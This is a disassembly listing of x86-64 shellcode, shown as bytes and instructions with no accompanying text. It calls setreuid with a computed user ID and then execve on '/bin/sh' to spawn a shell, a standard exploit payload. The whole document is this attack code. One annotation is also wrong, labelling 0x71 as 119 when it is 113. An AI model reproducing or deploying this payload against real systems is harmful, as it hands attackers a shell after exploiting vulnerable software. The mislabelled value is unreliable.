0:  6a 71                   push   0x71 (119)
2:  58                      pop    rax
3:  8d 7c c0 02             lea    edi,[rax+rax*8+0x2]
7:  89 fe                   mov    esi,edi
9:  0f 05                   syscall
b:  31 f6                   xor    esi,esi
d:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
14: 73 68 00 
17: 53                      push   rbx
18: 54                      push   rsp
19: 5f                      pop    rdi
1a: b0 3b                   mov    al,0x3b
1c: 0f 05                   syscall
